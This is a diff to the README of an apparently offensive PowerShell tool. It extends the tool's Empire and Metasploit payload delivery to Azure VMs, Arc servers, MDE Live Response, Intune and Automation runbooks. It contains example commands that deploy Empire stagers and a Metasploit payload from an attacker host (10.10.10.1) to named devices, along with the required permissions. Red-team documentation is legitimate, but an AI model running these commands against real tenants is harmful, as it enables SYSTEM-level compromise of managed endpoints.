@@ -1699,7 +1699,12 @@ Both `empire-exec` and `met-inject` support the same execution methods as the `e
 |--------|-------------|-------------|
 | **vmrun** (default) | Azure VMs | Uses Azure VM Run Command (synchronous) |
 | **arc** | Arc-enabled servers | Uses Azure Arc Run Command (synchronous) |
-| **auto** | All | Auto-detects best method based on target type |
+| **mde** | MDE-enrolled devices | Uses MDE Live Response (async with polling) |
+| **intune** | Intune-managed devices | Uses Intune Proactive Remediation (async) |
+| **automation** | Automation Hybrid Workers | Uses Azure Automation runbooks (job-based) |
+| **auto** | All | Auto-detects best method: vmrun → arc → mde → intune |
+
+> **Note**: All methods require **Windows** targets since Empire and Metasploit payloads are PowerShell-based. Non-Windows devices are automatically skipped with an informational message.
 
 **Targeting Options:**
 
@@ -1707,20 +1712,36 @@ Both `empire-exec` and `met-inject` support the same execution methods as the `e
 |-----------|-------------|
 | `-VMName` | Single Azure VM by name |
 | `-AllVMs` | All Azure VMs (with optional `-ResourceGroup` filter) |
-| `-DeviceName` | Single Arc-enabled device by name |
+| `-DeviceName` | Single Arc-enabled device by name (also searches MDE/Intune) |
 | `-AllDevices` | All Arc-enabled devices |
 | `-ResourceGroup` | Filter targets by resource group |
 | `-SubscriptionId` | Target specific subscription |
-| `-ExecMethod` | Force specific execution method (auto, vmrun, arc) |
+| `-ExecMethod` | Force specific execution method (auto, vmrun, arc, mde, intune, automation) |
+
+**MDE/Intune/Automation Examples:**
+
+```powershell
+# Deploy Empire stager via MDE Live Response
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -DeviceName "LAPTOP-001" -ExecMethod mde
+
+# Deploy Metasploit payload via Intune
+.\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc -DeviceName "DESKTOP-002" -ExecMethod intune
+
+# Auto-detect best method (tries vmrun → arc → mde → intune)
+.\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -DeviceName "TARGET-PC"
+```
 
 ### Required Permissions
 
 Same as the `exec` command:
 
-| Method | Required RBAC Roles |
+| Method | Required RBAC Roles / API Permissions |
 |--------|---------------------|
 | **vmrun** | Virtual Machine Contributor or Reader + Virtual Machine Command Executor |
 | **arc** | Azure Connected Machine Resource Administrator |
+| **mde** | Machine.LiveResponse, Machine.Read.All (MDE Security API) |
+| **intune** | DeviceManagementManagedDevices.PrivilegedOperations.All (Microsoft Graph) |
+| **automation** | Automation Contributor role
 
 ### Attack Workflow
 
@@ -1763,12 +1784,12 @@ Same as the `exec` command:
 
 | Aspect | On-Premises (NetExec) | Azure (AZexec) |
 |--------|----------------------|----------------|
-| **Delivery** | SMB/WMI | Azure VM Run Command / Arc Run Command |
-| **Authentication** | NTLM/Kerberos | Azure AD OAuth2 |
+| **Delivery** | SMB/WMI | VM Run Command, Arc, MDE Live Response, Intune, Automation |
+| **Authentication** | NTLM/Kerberos | Azure AD / Entra ID OAuth2 |
 | **Payload Type** | PowerShell cradle | PowerShell cradle |
-| **Target Discovery** | Network scan | Azure Resource Manager API |
-| **Execution Context** | User/Admin | SYSTEM (Azure execution default) |
-| **Logging** | Windows Event Logs | Azure Activity Logs |
+| **Target Discovery** | Network scan | Azure RM API, MDE API, Microsoft Graph |
+| **Execution Context** | User/Admin | SYSTEM (Azure/MDE/Intune default) |
+| **Logging** | Windows Event Logs | Azure Activity Logs, MDE Timeline, Intune Logs |
 
 ---
 
